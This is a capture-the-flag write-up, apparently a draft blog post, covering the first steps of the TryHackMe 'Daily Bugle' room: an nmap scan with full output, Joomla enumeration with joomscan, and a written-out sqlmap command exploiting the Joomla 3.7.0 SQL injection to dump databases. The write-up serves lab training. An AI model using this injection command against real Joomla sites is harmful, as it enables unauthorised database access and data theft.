---
title: Daily Bugle Writeup
published: false
---
# TryHackMe - Daily Bugle  
___________________________
![](assets/images/dailybugle/dailybugle_joomlalogin.png)
<br>
<br>

This continues my offensive security path on [TryHackMe](https://tryhackme.com/room/dailybugle). This room involves some sqli, cracking hashes, and priv esc with yum. As always I'll start with my standard `nmap` scan of the box.
<br>
<br>

## nmap scan

```
nmap -sC -sV -oN nmap/daily_initialnmap.txt 10.10.203.11
Starting Nmap 7.80 ( https://nmap.org ) at 2020-09-14 12:05 EDT
Nmap scan report for 10.10.203.11
Host is up (0.20s latency).
Not shown: 995 closed ports
PORT     STATE    SERVICE       VERSION
22/tcp   open     ssh           OpenSSH 7.4 (protocol 2.0)
| ssh-hostkey:
|   2048 68:ed:7b:19:7f:ed:14:e6:18:98:6d:c5:88:30:aa:e9 (RSA)
|   256 5c:d6:82:da:b2:19:e3:37:99:fb:96:82:08:70:ee:9d (ECDSA)
|_  256 d2:a9:75:cf:2f:1e:f5:44:4f:0b:13:c2:0f:d7:37:cc (ED25519)
80/tcp   open     http          Apache httpd 2.4.6 ((CentOS) PHP/5.6.40)
|_http-generator: Joomla! - Open Source Content Management
| http-robots.txt: 15 disallowed entries
| /joomla/administrator/ /administrator/ /bin/ /cache/
| /cli/ /components/ /includes/ /installation/ /language/
|_/layouts/ /libraries/ /logs/ /modules/ /plugins/ /tmp/
|_http-server-header: Apache/2.4.6 (CentOS) PHP/5.6.40
|_http-title: Home
1119/tcp filtered bnetgame
1152/tcp filtered winpoplanmess
3306/tcp open     mysql         MariaDB (unauthorized)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 48.75 seconds
```
<br>
<br>

It looks like we have port 22 and port 80 open. There's a website with disallowed entries on `robots.txt` and looks to be running Joomla CMS.
<br>
<br>

## web enumeration

The page is pretty basic for the most part. Looks like one post about spider-man robbing a bank. There's a login form to the side that gives us an interesting url to test for sqli. Testing out the robots.txt disallowed entries leads me to a Joomla login page. It turns out that in the repos for kali there is a tool for enumerating Joomla called `joomscan`. We can download the tool with `sudo apt install joomscan`. Once installed we can run it on the box with `joomscan -u http://10.10.60.90/`. It returns all kinds of valuable info such as firewalls, version info, and robots.txt disallowed entries (although we already knew those from the nmap scan). Turns out we're dealing with `Joomla 3.7.0` which has a known exploit on [exploit-db](https://www.exploit-db.com/exploits/42033). While this is not a manual exploit, it gives us valuable info on how to run sqlmap to get a database dump. It contains the following command:
<br>
<br>

`sqlmap -u "http://<machine-ip>/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" --risk=3 --level=5 --random-agent --dbs`
<br>
<br>

Now, this command gives us a dump of the databases, but once it returns we'll need to run it again with a more specific `-D` to specify one of the databases to dump. A tool like `SQLmap`, while great is not allowed on the OSCP, so I may go back and try it with a manual exploit (assuming there is one), but for now I need some more practice with `SQLmap` so I'm not too concerned about it at this point.
